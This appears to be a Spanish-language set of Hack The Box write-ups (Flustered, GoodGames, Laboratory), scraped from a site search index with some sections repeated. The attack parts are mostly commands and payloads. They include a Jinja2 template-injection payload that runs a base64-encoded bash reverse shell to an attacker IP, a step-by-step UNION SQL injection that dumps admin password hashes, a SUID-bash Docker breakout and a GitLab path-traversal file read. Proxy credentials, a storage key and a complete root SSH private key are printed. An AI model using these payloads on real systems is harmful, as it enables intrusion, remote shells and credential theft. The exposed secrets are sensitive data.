2022-09-03 18:41 CEST Nmap scan report for steampunk-era.htb (10.10.11.131) Host is up (0.037s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 93:31:fc:38:ff:2f:a7:fd:89:a3:48:bf:ed:6b:97:cb (RSA) | 256 e5:f8:27:4c:38:40:59:e0:56:e7:39:98:6b:86:d7:3a (ECDSA) |_ 256 62:6d:ab:81:fc:d2:f7:a1:c1:9d:39:cc:f2:7a:a1:6a (ED25519) 80/tcp open http nginx 1.14.2 |_http-title: steampunk-era.htb - Coming Soon |_http-server-header: nginx/1.14.2 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind |_ 100000 3,4 111/udp6 rpcbind 3128/tcp open http-proxy Squid http proxy 4.6 |_http-title: ERROR: The requested URL could not be retrieved |_http-server-header: squid/4.6 24007/tcp open rpcbind 49152/tcp open ssl/unknown | ssl-cert: Subject: commonName=flustered.htb | Not valid before: 2021-11-25T15:27:31 |_Not valid after: 2089-12-13T15:27:31 |_ssl-date: TLS randomness does not represent time 49153/tcp open rpcbind En el puerto 24007 se encuentra el servicio gluster: > apt install glusterfs-server Leyendo lista de paquetes... Hecho Creando \u00e1rbol de dependencias... Hecho Leyendo la informaci\u00f3n de estado... Hecho glusterfs-server ya est\u00e1 en su versi\u00f3n m\u00e1s reciente ( 9 .2-1 ) . Los paquetes indicados a continuaci\u00f3n se instalaron de forma autom\u00e1tica y ya no son necesarios. libindicator3-7 linux-compiler-gcc-11-x86 linux-headers-5.16.0-12parrot1-common linux-kbuild-5.16 Utilice \u00abapt autoremove\u00bb para eliminarlos. 0 actualizados, 0 nuevos se instalar\u00e1n, 0 para eliminar y 4 no actualizados. > apt install glusterfs-client Leyendo lista de paquetes... Hecho Creando \u00e1rbol de dependencias... Hecho Leyendo la informaci\u00f3n de estado... Hecho glusterfs-client ya est\u00e1 en su versi\u00f3n m\u00e1s reciente ( 9 .2-1 ) . Los paquetes indicados a continuaci\u00f3n se instalaron de forma autom\u00e1tica y ya no son necesarios. libindicator3-7 linux-compiler-gcc-11-x86 linux-headers-5.16.0-12parrot1-common linux-kbuild-5.16 Utilice \u00abapt autoremove\u00bb para eliminarlos. 0 actualizados, 0 nuevos se instalar\u00e1n, 0 para eliminar y 4 no actualizados. > gluster --remote-host = 10 .10.11.131 volume list vol1 vol2 > mount.glusterfs flustered.htb:/vol1 /home/x/Documentos/htb/flustered/puntodemontaje Mount failed. Check the log file for more details. # Miramos los logs y vemos un problema de que no resuelve flustered, por lo cual lo agregamos al fichero hosts: > cat /var/log/glusterfs/home-x-Documentos-htb-flustered-puntodemontaje.log | grep fail [ 2022 -09-03 18 :24:49.784146 +0000 ] E [ name.c:264:af_inet_client_get_remote_sockaddr ] 0 -vol2-client-0: DNS resolution failed on host flustered [ 2022 -09-03 18 :24:49.790468 +0000 ] E [ fuse-bridge.c:5362:fuse_first_lookup ] 0 -fuse: first lookup on root failed ( Transport endpoint is not connected ) # La siguiente vez que lo corremos para montar el vol1 da otro error de certificados, de los cuales no disponemos: > cat /var/log/glusterfs/home-x-Documentos-htb-flustered-puntodemontaje.log | grep ssl 8 : option transport.socket.ssl-enabled off 8 : option transport.socket.ssl-enabled off [ 2022 -09-03 18 :33:32.282587 +0000 ] I [ socket.c:4279:ssl_setup_connection_params ] 0 -vol1-client-0: SSL support for MGMT is NOT enabled IO path is ENABLED certificate depth is 1 for peer [ 2022 -09-03 18 :33:32.283217 +0000 ] E [ socket.c:4397:ssl_setup_connection_params ] 0 -vol1-client-0: could not load our cert at /etc/ssl/glusterfs.pem # Se procede a montar el vol2: > mount.glusterfs flustered.htb:/vol2 /home/x/Documentos/htb/flustered/puntodemontaje # De este modo obtenemos los credenciales de Squid Proxy: > pwd /home/x/Documentos/htb/flustered/puntodemontaje/squid > strings passwd.ibd infimum supremum lance.friedman ( user ) o>WJ5-jD< 5 ^m3 ( passwd ) Lance Friedman","title":"Enum"},{"location":"maquinas/linux/flustered/#squid-proxy-configuration","text":"Ya se puede configurar el Squid Proxy para revisar esa parte: # Acceso a Squid Proxy desde curl: > curl -v -s --proxy 'http://10.10.11.131:3128' -U 'lance.friedman:o>WJ5-jD<5^m3' http://10.10.11.131/ # Variante: > curl -v -s --proxy 'http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128' 10 .10.11.131 # Acceso con Proxychains: > tail /etc/proxychains.conf # add proxy here ... #socks5 127.0.0.1 1080 http 10 .10.11.131 3128 lance.friedman o>WJ5-jD< 5 ^m3 #http 127.0.0.1 8080 > proxychains curl -s 10 .10.11.131 [ proxychains ] config file found: /etc/proxychains.conf [ proxychains ] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [ proxychains ] DLL init: proxychains-ng 4 .14 [ proxychains ] Strict chain ... 10 .10.11.131:3128 ... 10 .10.11.131:80 ... OK <html> <head> <title>steampunk-era.htb - Coming Soon</title> </head> <body style = \"background-image: url('/static/steampunk-3006650_1280.webp');background-size: 100%;background-repeat: no-repeat;\" > </body> </html> # Fuzzing con FFUF (Hay que urlencodear algunos chars \"man ascii\") > ffuf -replay-proxy \"http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1/FUZZ # Unicamente me ha funcionado bien con Gobuster: gobuster dir --proxy \"http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1 /app ( Status: 301 ) [ Size: 185 ] [ --> http://127.0.0.1/app/ ]","title":"Squid Proxy Configuration:"},{"location":"maquinas/linux/flustered/#ssti-server-site-template-injection-reverse-shell","text":"Fuzzeando se encuentra c\u00f3digo en python: gobuster dir --proxy \"http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1/app -x py,php WJ5-jDDocumentos/htb/flustered5m3@10.10.11.131:3128 \" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1/app -x py,php - Parrot Terminal=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://127.0.0.1/app [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Proxy: http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128 [+] User Agent: gobuster/3.1.0 [+] Extensions: py,php [+] Timeout: 10s =============================================================== 2022/09/03 22:54:28 Starting gobuster in directory enumeration mode =============================================================== /templates (Status: 301) [Size: 185] [--> http://127.0.0.1/app/templates/] /static (Status: 301) [Size: 185] [--> http://127.0.0.1/app/static/] /app.py (Status: 200) [Size: 748] /config (Status: 301) [Size: 185] [--> http://127.0.0.1/app/config/] Revisando el c\u00f3digo python que contiene la librer\u00eda flask se puede observar que es vulnerable a inyecci\u00f3n de c\u00f3digo en def getsiteurl ( config ): if config and \"siteurl\" in config : return config [ \"siteurl\" ] else : return \"steampunk-era.htb\" @app . route ( \"/\" , methods = [ 'GET' , 'POST' ]) def index_page (): # Will replace this with a proper file when the site is ready config = request . json template = f ''' <html> <head> <title> { getsiteurl ( config ) } - Coming Soon</title> </head> <body style=\"background-image: url(' { url_for ( 'static' , filename = 'steampunk-3006650_1280.webp' ) } ');background-size: 100%;background-repeat: no-repeat;\"> </body> </html> ''' return render_template_string ( template ) if __name__ == \"__main__\" : app . run ()","title":"SSTI (Server Site Template Injection) =&gt; Reverse Shell"},{"location":"maquinas/linux/flustered/#ssti-server-side-template-injection","text":"SSTI RCE GET / HTTP/1.1 Host: flustered.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 21 Content-Type: application/json {\"siteurl\":\"{{5*5}}\"} El par\u00e1metro custome es vulnerable a SSTI: Se adjunta el token a la p\u00e1quina que no teniamos autorizaci\u00f3n # Payload que ejecuta un ls: \"siteurl\" : \"{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\" RCE - Forma de ejecutar una shell reversa: echo 'bash -c \"bash -i >& /dev/tcp/10.10.14.16/4443 0>&1\"' | base64 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQzIDA+JjEiCg == # Payload para ganar acceso a la m\u00e1quina v\u00edctima: Content-Type: application/json { \"siteurl\" : \"{{config.__class__.__init__.__globals__['os'].popen('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQzIDA+JjEiCg==| base64 -d | bash').read()}}\" }","title":"SSTI (Server Side Template Injection)"},{"location":"maquinas/linux/flustered/#escalate-privileges","text":"Una vez dentro de la m\u00e1quina se copian los certificados que nos faltaban antes para montar el vol1: > ls -la /etc/ssl drwxr-xr-x root root 122 B Sun Sep 4 01 :44:07 2022 \uf115 . drwxr-xr-x root root 6 .3 KB Sat Sep 3 21 :03:55 2022 \uf115 .. drwxr-xr-x root root 10 KB Wed Jul 7 20 :55:00 2021 \uf115 certs drwx--x--- root ssl-cert 42 B Wed Jul 7 20 :55:00 2021 \uf115 private .rw-r--r-- root root 4 .0 KB Sun Sep 4 01 :44:06 2022 \uf016 glusterfs.ca .rw-r--r-- root root 3 .2 KB Sun Sep 4 01 :42:47 2022 \uf016 glusterfs.key .rw-r--r-- root root 1 .8 KB Sun Sep 4 01 :41:12 2022 \uf016 glusterfs.pem .rw-r--r-- root root 11 KB Thu Mar 25 21 :49:34 2021 \uf016 openssl.cnf > mount.glusterfs flustered.htb:/vol1 /home/x/Documentos/htb/flustered/puntodemontaje > ls -la drwxr-x--- x docker 4 .0 KB Mon Oct 25 07 :49:56 2021 \uf115 . drwxr-xr-x root root 170 B Sat Sep 3 23 :20:12 2022 \uf115 .. drwx------ x docker 4 .0 KB Mon Oct 25 07 :44:58 2021 \uf115 .gnupg drwx------ x docker 4 .0 KB Tue Dec 7 20 :54:21 2021 \uf115 .ssh lrwxrwxrwx x docker 9 B Thu Oct 28 08 :59:15 2021 \uf481 .bash_history \u21d2 /dev/null .rw-r--r-- x docker 220 B Mon Sep 20 14 :27:59 2021 \uf016 .bash_logout .rw-r--r-- x docker 3 .4 KB Mon Sep 20 14 :27:59 2021 \uf489 .bashrc .rw-r--r-- x docker 807 B Mon Sep 20 14 :27:59 2021 \uf016 .profile .r-------- x docker 33 B Sat Sep 3 14 :29:46 2022 \uf15c user.txt > catn user.txt 86af85b760eb29b5b87c1e0d79508480 # Mirando el home de la m\u00e1quina comprometida se observa que solo existe el usuario jennifer. # Se deduce que el punto de montaje de vol1 es un directorio compartido de su home, por lo cual se genera un par de claves ssh y se introduce la publica dentro del authorized_keys ssh-keygen -f jennifer cat jennifer.pub > authorized_keys # Se copia la clave privada a la m\u00e1quina v\u00edctima y se accede por ssh a localhost con el usuario jennifer ssh jennifer@localhost -i /dev/shm/id_rsa_jennifer ( funcionar\u00eda desde la m\u00e1quina de atacante ya que es el mismo objetivo )","title":"Escalate privileges"},{"location":"maquinas/linux/flustered/#escalada-a-root","text":"A trav\u00e9s de scripts de enumeraci\u00f3n se encuentra un contenedor con un puerto abierto: #!/bin/bash for i in $( seq 1 254 ) ; do timeout 1 ping -c 1 172 .17.0. $i & >/dev/null && echo \"[!] arriba $i \" & done ; wait #!/bin/bash for port in $( seq 1 65535 ) ; do timeout 1 bash -c \"echo '' > /dev/tcp/172.17.0.2/ $port \" 2 >/dev/null && echo \"[+] puerto $port abierto\" & done ; wait Creamos un local port forwarding con ssh para tener mayor control: > ssh -L 10000 :172.17.0.2:10000 jennifer@10.10.11.131 -i jennifer # Es un servicio de Azure que se gestiona a trav\u00e9s > nmap -sCV -p10000 localhost Starting Nmap 7 .92 ( https://nmap.org ) at 2022 -09-04 03 :24 CEST Nmap scan report for localhost ( 127 .0.0.1 ) Host is up ( 0 .000084s latency ) . Other addresses for localhost ( not scanned ) : ::1 PORT STATE SERVICE VERSION 10000 /tcp open snet-sensor-mgmt? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: | HTTP/1.1 400 Bad Request | Connection: close | FourOhFourRequest: | HTTP/1.1 500 Internal Server Error | Server: Azurite-Blob/3.14.3 | Date: Sun, 04 Sep 2022 01 :24:57 GMT | Connection: close | GetRequest: | HTTP/1.1 500 Internal Server Error | Server: Azurite-Blob/3.14.3 | Date: Sun, 04 Sep 2022 01 :24:51 GMT | Connection: close > apt update > apt install snapd > snap install storage-explorer > storage-explorer ( el programa me deja iniciarlo con un usuario no root ) # Tras iniciarlo se adjunta un recurso y se selecciona Emulador de almacenamiento local, y usamos el usuario jennifer y la key de la m\u00e1quina v\u00edctima: jennifer@flustered:/tmp$ cat /var/backups/key FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ == # Solo me ha funcionado con la version 1.22.1, lo mejor es usarlo desde Windows # Root id_rsa: -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAvrfifWpWEAtxdHG7wTIqLGYPJo3TJ/+HzrrYHyzDBADpNEl2U+vi NYW2N69F6n0Yjd7XZox69xb4AG0FOe6/SEXi+e960L023luJ7UUaJUxravi4BqAPabiZ5Q D0kT7hX+MTyVLPKqzs+AbPTzY2GOxUNMAE1wbmV9kl4P28dU7tkNKa2eXBm6GY+tQosz/j 5MAuF5Nq7WQ26ngBfQHSwUkC5+FCzD5yA1NnvcGIuKu0SK0J+jPSp50tY8yTkF72IuTRsM Lvo9dkqyzAa1QoHxkLtm8lptX62BEIlnxYA2zUntlj0g6/G/OMKwkosTvJTK0fdMrloiQn jjnoNvikGwAAA8jGJr9zxia/cwAAAAdzc2gtcnNhAAABAQC+t+J9alYQC3F0cbvBMiosZg 8mjdMn/4fOutgfLMMEAOk0SXZT6+I1hbY3r0XqfRiN3tdmjHr3FvgAbQU57r9IReL573rQ vTbeW4ntRRolTGtq+LgGoA9puJnlAPSRPuFf4xPJUs8qrOz4Bs9PNjYY7FQ0wATXBuZX2S Xg/bx1Tu2Q0prZ5cGboZj61CizP+PkwC4Xk2rtZDbqeAF9AdLBSQLn4ULMPnIDU2e9wYi4 q7RIrQn6M9KnnS1jzJOQXvYi5NGwwu+j12SrLMBrVCgfGQu2byWm1frYEQiWfFgDbNSe2W PSDr8b84wrCSixO8lMrR90yuWiJCeOOeg2+KQbAAAAAwEAAQAAAQEAqqr1dJPu9ia3XaPV h9qzYM3n6vFpr1Z9GqObebJdxbxm9FJ1ID5rTMgeOxCPOXq+uV5cVbmK5IjaX88vqRscc7 mOl2kV96wLaMpz0C9RaWVMjwqJ6+vaPxpiJUtIkJ27o0oaz8NZ/m+HE6FMbS8vE/iQli/r ZN0Yzi5VNlT6C+KKX9GBD8j4xIC6Gs1bblVmWz71V9JkfpFRdBAlk7/MHLNhg7rdHywo27 H0XBvjpbBVbEpLykvHxNb4Ik5TQ5RGioPU2SftgDyy94oksDpM6u1uj7gBQbnPZn7jzMG7 6bj54dlyf5bvL2q/Jq63tQw6KGbcAcbpsSwmn53e0CaXqQAAAIEA0JIB140zTamK2c5L9K gBeRXKZKZ4UtvVtZPKIdlbflUFheDNwj5FtCMICFOLV+cyBQcwJJv135lj8A6OAbz4z9mT dw+4aCnnAZactRHECxxjaPVr9qpN9CDFFyPDa5izQ/oqUQMdgztEJxjHFrWzGy5QHExKpB cWv9mhSs3E4GMAAACBAPlANmPbMgfKQEh4tya3sPvUIxvy46pX8GcAvNK++bGU195oY7a6 3w7L62mge95O8zjUOvNoCmBs4dpPKXLOdpk3XpRZSm90Wgxe85xMBHhW2kwIBfqPHUiZj+ A5jKEYSTWjFQfHEVrIbUTAJ7dixtuKLdATxdgYiuzxS/AmSPhvAAAAgQDD4e3lJMh1KVop a7xdCR3xhXCQ7Jm7u/4f5txWS4DEuRVUmvQ3pqqg72nX27vCmPN6/moidXnxVqJ06K/40l KMQG/hRwUGBMxPBVec5O63H5FBd9g3cVUSMA4Fwy6hUWjYMXcNVwugogkW/T0XLUp/w+X/ TGdaVjEDWhNuypttFQAAAA5yb290QGZsdXN0ZXJlZAECAw == -----END OPENSSH PRIVATE KEY-----","title":"Escalada a root"},{"location":"maquinas/linux/goodgames/","text":"Goodgames HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.130 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.130 Se realiza un scan de los puertos abiertos: nmap -sVC -p80 10.10.11.130 -oN openPorts PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.51 |_http-server-header: Werkzeug/2.0.2 Python/3.9.2 |_http-title: GoodGames | Community and Store Service Info: Host: goodgames.htb SQLinjection (se consigue la password del admin de la web) Tras revisar la web goodgames.htb se puede ver que el apartado login es vulnerable a cl\u00e1sica inyeccion sql de 'or 1=1-- - (Dicha inyecci\u00f3n nos perimte bypassear el panel y nos da la cookie) # En el campo de registro da una respuesta diferente al ordenar por 5 columnas POST /login HTTP/1.1 Host: goodgames.htb Content-Length: 35 Cache-Control: max-age = 0 Upgrade-Insecure-Requests: 1 Origin: http://goodgames.htb Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 ( Windows NT 10 .0 ; Win64 ; x64 ) AppleWebKit/537.36 ( KHTML, like Gecko ) Chrome/104.0.5112.81 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml ; q = 0 .9,image/avif,image/webp,image/apng,*/* ; q = 0 .8,application/signed-exchange ; v = b3 ; q = 0 .9 Referer: http://goodgames.htb/ Accept-Encoding: gzip, deflate Accept-Language: es-ES,es ; q = 0 .9 Connection: close email = 'order by 4-- -&password=pass # Con la siguiente inyecci\u00f3n se puede ver el output de la columna 4: email=' union select 1 ,2,3,4-- - & password = a # La version de la base de datos es 8.0.27 email = 'union select 1,2,3,version()-- -&password=a # La base de datos actual es MAIN email=' union select 1 ,2,3,database () -- - & password = a # La primera bbdd es information_schema email = 'union select 1,2,3,schema_name from information_schema.schemata limit 0,1-- -&password=a # Y la segunda main email=' union select 1 ,2,3,schema_name from information_schema.schemata limit 1 ,1-- - & password = a # Las tablas de main son blog, blogcomments, y user: email = 'union select 1,2,3,table_name from information_schema.tables where table_schema=\"main\"-- -&password=a # Enumerar columnas (email,name, password): email=' union select 1 ,2,3,column_name from information_schema.columns where table_schema = \"main\" and table_name = \"user\" -- - & password = a # Se consigue el hash de admin (admin:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec) email = ' union select 1 ,2,3,group_concat ( name,0x3a,email,0x3a,password ) from main.user-- - & password = a # Crackstation: 2b22337f218b2d82dfc3b6f77e7cb8ec md5 superadministrator SSTI - Gaining Access (root container) - user flag Revisando el acceso de la web (goodgames.htb)con el usuario admin, se descubre un bot\u00f3n que nos lleva a otro subdominio, internal-administration.goodgames.htb y se accede tambien con credenciales admin:superadministrator. Se sospecha que puede ser vulnerable a SSTI ya que utiliza las tecnolog\u00edas flask con jinja2: # SSTI flask app en el apartado settings en full name introducimos el siguiente payload: { \"siteurl\" : \"{{config.__class__.__init__.__globals__['os'].popen('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS80NDQzIDA+JjEiCg==| base64 -d | bash').read()}}\" } # Se obtiene la flag de user dentro del contenedor: root@3a453ab39d3d:/home/augustus# cat user.txt c900acc56854d9da3af52c68a69adea0 Docker Breakout (Privilege Escalation) [PIVOTING] Se observa usuario augustus no existe en el contenedor y se deduce que es una montura de la m\u00e1quina v\u00edctima, para el acceso funciona la reutilizaci\u00f3n de password (superadministrator) o generar un par de claves de ssh sobre el home del usuario: root@3a453ab39d3d:/home# ssh augustus@172.19.0.1 The authenticity of host '172.19.0.1 (172.19.0.1)' can 't be established. ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added ' 172 .19.0.1 ' (ECDSA) to the list of known hosts. augustus@172.19.0.1' s password: Linux GoodGames 4 .19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 The programs included with the Debian GNU/Linux system are free software ; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. # La escalada se realiza copiando el binario de bash desde la m\u00e1quina victima al home, y luego posteriormente desde el contenedor como root d\u00e1ndole los permisos adecuados. augustus@GoodGames:~$ cp /bin/bash . augustus@GoodGames:~$ exit logout root@3a453ab39d3d:/home# chown root:root ./augustus/bash root@3a453ab39d3d:/home# chmod 4755 ./augustus/bash root@3a453ab39d3d:/home# ssh augustus@172.19.0.1 augustus@172.19.0.1 ' s password: superadministrator Linux GoodGames 4 .19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 Last login: Mon Sep 26 20 :13:33 2022 from 172 .19.0.2 augustus@GoodGames:~$ /home/augustus/bash -p bash-5.1# cat /root/root.txt 80e40e7d8f146ef3a2488485c0f4da87","title":"Goodgames"},{"location":"maquinas/linux/goodgames/#goodgames-htb","text":"","title":"Goodgames HTB"},{"location":"maquinas/linux/goodgames/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.130","title":"Recon"},{"location":"maquinas/linux/goodgames/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.130 Se realiza un scan de los puertos abiertos: nmap -sVC -p80 10.10.11.130 -oN openPorts PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.51 |_http-server-header: Werkzeug/2.0.2 Python/3.9.2 |_http-title: GoodGames | Community and Store Service Info: Host: goodgames.htb","title":"Enum"},{"location":"maquinas/linux/goodgames/#sqlinjection-se-consigue-la-password-del-admin-de-la-web","text":"Tras revisar la web goodgames.htb se puede ver que el apartado login es vulnerable a cl\u00e1sica inyeccion sql de 'or 1=1-- - (Dicha inyecci\u00f3n nos perimte bypassear el panel y nos da la cookie) # En el campo de registro da una respuesta diferente al ordenar por 5 columnas POST /login HTTP/1.1 Host: goodgames.htb Content-Length: 35 Cache-Control: max-age = 0 Upgrade-Insecure-Requests: 1 Origin: http://goodgames.htb Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 ( Windows NT 10 .0 ; Win64 ; x64 ) AppleWebKit/537.36 ( KHTML, like Gecko ) Chrome/104.0.5112.81 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml ; q = 0 .9,image/avif,image/webp,image/apng,*/* ; q = 0 .8,application/signed-exchange ; v = b3 ; q = 0 .9 Referer: http://goodgames.htb/ Accept-Encoding: gzip, deflate Accept-Language: es-ES,es ; q = 0 .9 Connection: close email = 'order by 4-- -&password=pass # Con la siguiente inyecci\u00f3n se puede ver el output de la columna 4: email=' union select 1 ,2,3,4-- - & password = a # La version de la base de datos es 8.0.27 email = 'union select 1,2,3,version()-- -&password=a # La base de datos actual es MAIN email=' union select 1 ,2,3,database () -- - & password = a # La primera bbdd es information_schema email = 'union select 1,2,3,schema_name from information_schema.schemata limit 0,1-- -&password=a # Y la segunda main email=' union select 1 ,2,3,schema_name from information_schema.schemata limit 1 ,1-- - & password = a # Las tablas de main son blog, blogcomments, y user: email = 'union select 1,2,3,table_name from information_schema.tables where table_schema=\"main\"-- -&password=a # Enumerar columnas (email,name, password): email=' union select 1 ,2,3,column_name from information_schema.columns where table_schema = \"main\" and table_name = \"user\" -- - & password = a # Se consigue el hash de admin (admin:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec) email = ' union select 1 ,2,3,group_concat ( name,0x3a,email,0x3a,password ) from main.user-- - & password = a # Crackstation: 2b22337f218b2d82dfc3b6f77e7cb8ec md5 superadministrator","title":"SQLinjection (se consigue la password del admin de la web)"},{"location":"maquinas/linux/goodgames/#ssti-gaining-access-root-container-user-flag","text":"Revisando el acceso de la web (goodgames.htb)con el usuario admin, se descubre un bot\u00f3n que nos lleva a otro subdominio, internal-administration.goodgames.htb y se accede tambien con credenciales admin:superadministrator. Se sospecha que puede ser vulnerable a SSTI ya que utiliza las tecnolog\u00edas flask con jinja2: # SSTI flask app en el apartado settings en full name introducimos el siguiente payload: { \"siteurl\" : \"{{config.__class__.__init__.__globals__['os'].popen('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS80NDQzIDA+JjEiCg==| base64 -d | bash').read()}}\" } # Se obtiene la flag de user dentro del contenedor: root@3a453ab39d3d:/home/augustus# cat user.txt c900acc56854d9da3af52c68a69adea0","title":"SSTI - Gaining Access (root container) - user flag"},{"location":"maquinas/linux/goodgames/#docker-breakout-privilege-escalation-pivoting","text":"Se observa usuario augustus no existe en el contenedor y se deduce que es una montura de la m\u00e1quina v\u00edctima, para el acceso funciona la reutilizaci\u00f3n de password (superadministrator) o generar un par de claves de ssh sobre el home del usuario: root@3a453ab39d3d:/home# ssh augustus@172.19.0.1 The authenticity of host '172.19.0.1 (172.19.0.1)' can 't be established. ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added ' 172 .19.0.1 ' (ECDSA) to the list of known hosts. augustus@172.19.0.1' s password: Linux GoodGames 4 .19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 The programs included with the Debian GNU/Linux system are free software ; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. # La escalada se realiza copiando el binario de bash desde la m\u00e1quina victima al home, y luego posteriormente desde el contenedor como root d\u00e1ndole los permisos adecuados. augustus@GoodGames:~$ cp /bin/bash . augustus@GoodGames:~$ exit logout root@3a453ab39d3d:/home# chown root:root ./augustus/bash root@3a453ab39d3d:/home# chmod 4755 ./augustus/bash root@3a453ab39d3d:/home# ssh augustus@172.19.0.1 augustus@172.19.0.1 ' s password: superadministrator Linux GoodGames 4 .19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 Last login: Mon Sep 26 20 :13:33 2022 from 172 .19.0.2 augustus@GoodGames:~$ /home/augustus/bash -p bash-5.1# cat /root/root.txt 80e40e7d8f146ef3a2488485c0f4da87","title":"Docker Breakout (Privilege Escalation) [PIVOTING]"},{"location":"maquinas/linux/laboratory/","text":"Laboratory HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.216 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.10.216 Se realiza un analisis de los puertos abiertos: > nmap -sCV -p22,53,80 10.10.10.216 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-08 22:19 CEST Nmap scan report for 10.10.10.216 Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA) | 256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA) |_ 256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-title: Did not follow redirect to https://laboratory.htb/ |_http-server-header: Apache/2.4.41 (Ubuntu) 443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: The Laboratory | ssl-cert: Subject: commonName=laboratory.htb | Subject Alternative Name: DNS:git.laboratory.htb | Not valid before: 2020-07-05T10:39:28 |_Not valid after: 2024-03-03T10:39:28 | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.41 (Ubuntu) |_ssl-date: TLS randomness does not represent time Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Se revisa el gitlab y su versi\u00f3n correspondiente, hay un art\u00edculo en HackerONE de arbitrary file read: GitLab vuln De este modo con el siguiente payload, si creas dos proyectos y generas un issue moviendolo al otro proyecto, puedes leer archivos de la maquina victima: Payload: ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd) root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync 